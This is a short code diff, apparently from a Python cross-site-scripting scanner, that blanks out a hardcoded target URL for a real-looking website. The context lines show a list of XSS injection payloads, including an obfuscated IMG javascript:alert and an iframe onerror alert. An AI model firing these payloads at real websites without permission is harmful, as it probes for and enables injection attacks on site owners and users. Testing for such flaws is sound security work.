@@ -190,7 +190,7 @@ class Xss(object):
 
 
 def main():
-    url = "http://www.agora.co.il/"
+    url = ""
     injections = [
         """<IMG SRC=" &#14;  javascript:alert('XSS');">""",
         """</title>"><iframe onerror="alert(/r4z/);" src=x></iframe>""",
